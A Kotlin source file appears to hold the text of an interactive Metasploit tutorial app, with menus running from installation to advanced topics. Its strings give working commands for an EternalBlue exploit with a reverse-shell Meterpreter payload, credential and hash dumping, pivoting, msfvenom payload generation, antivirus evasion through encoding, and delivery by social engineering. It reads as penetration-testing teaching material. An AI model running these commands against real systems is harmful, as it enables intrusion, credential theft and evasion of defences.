package com.guides.content

import com.guides.NavigationState

object MetasploitContentProvider: ContentProvider {
    override fun getWelcomeMessage(): String = """
💥 Welcome to the Metasploit Ref. Guide! 💥

This interactive tutorial will guide you through essential Metasploit concepts,
from basic exploitation to advanced payload development.

📖 What you'll learn:

• Basic Topics: Setup, modules, basic exploits
• Intermediate Topics: Meterpreter, post-exploitation, pivoting
• Advanced Topics: Custom payloads, scripting, evasion

🎯 How to navigate:

• Use the sidebar menu to select a topic category
• Click or tap to navigate through menus and subtopics
• Use the back button (← Back) to return to previous menus

🚀 Getting Started:

Choose a topic category from the sidebar to explore subtopics and start learning!
Each section includes explanations, examples, and best practices.

Good luck on your Metasploit journey! 🎓
    """.trimIndent()

    override fun getMenuContent(state: NavigationState): String {
        return when (state) {
            NavigationState.MAIN_MENU -> """
📚 Metasploit Ref. Guide

Select a category to begin:

📖 Basic Topics
Learn essential Metasploit fundamentals.

⚡ Intermediate Topics
Master exploitation techniques.

🚀 Advanced Topics
Dive into expert-level features.

❌ Exit
Close the application.
            """.trimIndent()
            NavigationState.BASIC_SUBMENU -> """
📰 Basic Topics Menu

Select a subtopic to begin learning:

🛠️ Installation & Setup
Installing Metasploit Framework.

🔍 Modules Overview
Understanding module types.

💥 Basic Exploits
Running simple exploits.

📡 Workspaces
Managing test environments.
            """.trimIndent()
            NavigationState.INTERMEDIATE_SUBMENU -> """
⚡ Intermediate Topics Menu

Select a subtopic to advance your Metasploit skills:

🖥️ Meterpreter
Using the Meterpreter shell.

🔄 Post-Exploitation
Gathering data post-exploit.

📊 Pivoting
Using compromised hosts.

🔎 Auxiliary Modules
Running non-exploit tasks.
            """.trimIndent()
            NavigationState.ADVANCED_SUBMENU -> """
🚀 Advanced Topics Menu

Select a subtopic for expert-level Metasploit knowledge:

📜 Custom Payloads
Creating custom payloads.

🛠️ Scripting
Writing Metasploit scripts.

🔍 Evasion Techniques
Bypassing antivirus.

🔄 Automation
Automating tasks.
            """.trimIndent()
        }
    }

    override fun getTopicContent(level: String, id: String): String {
        return when (level) {
            "basics" -> when (id) {
                "install" -> """
🛠️ Installation & Setup - Getting Started with Metasploit

Installing Metasploit Framework:

📥 Linux Installation:
• curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | bash
• sudo apt install metasploit-framework - Ubuntu/Debian

📥 Windows:
• Download installer from metasploit.com
• Run setup wizard

🔧 Initial Setup:
• msfconsole - Start Metasploit
• db_status - Check database connection
• msfdb init - Initialize database

⚠️ Safety Tips:
• Use in VM or sandbox
• Secure database credentials

💡 Pro Tips:
• Update: msfupdate
• Use msfconsole for CLI

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "modules" -> """
🔍 Modules Overview - Understanding Modules

Exploring Metasploit modules:

🔍 Types:
• Exploits: Gain access
• Payloads: Execute code
• Auxiliary: Scanning, fuzzing
• Post: Post-exploitation

📜 Using Modules:
• use exploit/windows/smb/ms17_010_eternalblue
• show options - View settings
• set RHOST target_ip

🛡️ Searching:
• search eternalblue
• search type:exploit platform:windows

⚠️ Safety Tips:
• Test in authorized environments
• Verify module stability

💡 Pro Tips:
• Save module configs
• Use show advanced for options

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "exploits" -> """
💥 Basic Exploits - Running Exploits

Executing simple exploits:

🔍 Select Exploit:
• use exploit/windows/smb/ms17_010_eternalblue
• set RHOST 192.168.1.100
• set PAYLOAD windows/meterpreter/reverse_tcp

📜 Run:
• exploit - Launch exploit
• check - Verify exploitability

🛡️ Options:
• set LHOST your_ip
• set LPORT 4444

⚠️ Safety Tips:
• Authorized targets only
• Log all actions

💡 Pro Tips:
• Use check before exploit
• Save session info

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "workspaces" -> """
📡 Workspaces - Managing Environments

Organizing test environments:

🔍 Create Workspace:
• workspace -a my_test
• workspace my_test - Switch workspace

📜 Managing:
• workspace -l - List workspaces
• workspace -d my_test - Delete workspace

🛡️ Usage:
• Isolate scans/exploits
• Manage multiple targets

⚠️ Safety Tips:
• Secure workspace data
• Clear unused workspaces

💡 Pro Tips:
• Use for project organization
• Export workspace data

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            "intermediate" -> when (id) {
                "meterpreter" -> """
🖥️ Meterpreter - Advanced Shell

Using Meterpreter for control:

🔍 Start Session:
• exploit > sessions -i 1
• meterpreter > help - View commands

📜 Common Commands:
• sysinfo - System information
• getuid - Current user
• ps - List processes
• shell - Drop to system shell

🛡️ File Operations:
• upload file - Upload to target
• download file - Download from target

⚠️ Safety Tips:
• Avoid production systems
• Log all actions

💡 Pro Tips:
• Use background to save session
• Combine with post modules

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "post" -> """
🔄 Post-Exploitation - Gathering Data

Post-exploitation techniques:

🔍 Modules:
• use post/windows/gather/credentials
• set SESSION 1
• run - Execute module

📜 Examples:
• post/windows/gather/hashdump
• post/multi/recon/local_exploit_suggester

🛡️ Data Collection:
• scrape passwords
• gather network info

⚠️ Safety Tips:
• Authorized systems only
• Secure collected data

💡 Pro Tips:
• Save output to files
• Automate with resource scripts

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "pivoting" -> """
📊 Pivoting - Network Expansion

Using compromised hosts:

🔍 Setup Pivot:
• meterpreter > route add 192.168.2.0 255.255.255.0 1
• use auxiliary/server/socks4a
• set SRVPORT 1080

📜 Scanning Through Pivot:
• nmap -n -Pn -p 80 192.168.2.0/24 -oA scan --proxies socks4://127.0.0.1:1080

🛡️ Benefits:
• Access internal networks
• Chain multiple pivots

⚠️ Safety Tips:
• Test in sandbox
• Monitor network impact

💡 Pro Tips:
• Use autoroute script
• Log pivot traffic

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "auxiliary" -> """
🔎 Auxiliary Modules - Non-Exploit Tasks

Using auxiliary modules:

🔍 Examples:
• use auxiliary/scanner/portscan/tcp
• set RHOSTS 192.168.1.0/24
• run - Execute scanner

📜 Types:
• Scanners: Port, service discovery
• Fuzzers: Test input handling
• DoS: Test system resilience

🛡️ Usage:
• Gather info pre-exploit
• Validate vulnerabilities

⚠️ Safety Tips:
• Avoid DoS on production
• Log all scans

💡 Pro Tips:
• Combine with workspaces
• Save results to DB

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            "advanced" -> when (id) {
                "payloads" -> """
📜 Custom Payloads - Creating Payloads

Building custom payloads:

🔍 Generate Payload:
• msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe

📜 Options:
• -e encoder - Encode payload
• -i iterations - Encode multiple times
• -a arch - Set architecture

🛡️ Delivery:
• Serve via web: auxiliary/server/http
• Use social engineering

⚠️ Safety Tips:
• Test in sandbox
• Avoid untrusted delivery

💡 Pro Tips:
• Use msfvenom -l for payload list
• Combine with encoders

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "scripting" -> """
🛠️ Scripting - Automating Metasploit

Writing Metasploit scripts:

🔍 Resource Scripts:
• Save as .rc file
• resource script.rc - Run script
• Example: set RHOSTS, run exploits

📜 Ruby Scripts:
• Use IRB in msfconsole
• Access framework API
• client.sessions.list - List sessions

🛡️ Automation:
• Automate scans, exploits
• Schedule via cron

⚠️ Safety Tips:
• Test scripts in VM
• Secure script storage

💡 Pro Tips:
• Use Ruby for complex tasks
• Log script output

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "evasion" -> """
🔍 Evasion Techniques - Bypassing AV

Avoiding antivirus detection:

🔍 Encoding:
• msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe

📜 Custom Payloads:
• Use Veil or Shellter
• Obfuscate code

🛡️ Testing:
• Test against AV in sandbox
• Use VirusTotal for checks

⚠️ Safety Tips:
• Ethical use only
• Log all tests

💡 Pro Tips:
• Combine multiple encoders
• Use stageless payloads

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "automation" -> """
🔄 Automation - Streamlining Tasks

Automating Metasploit workflows:

🔍 Resource Scripts:
• Create .rc with commands
• resource script.rc - Execute

📜 AutoRun:
• set AutoRunScript post/windows/gather/credentials
• Automate post-exploitation

🛡️ API:
• Use Metasploit RPC
• Python: pymetasploit3

⚠️ Safety Tips:
• Test automation in sandbox
• Secure API credentials

💡 Pro Tips:
• Integrate with CI/CD
• Log all automated actions

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            else -> "Content for $level-$id coming soon!"
        }
    }
}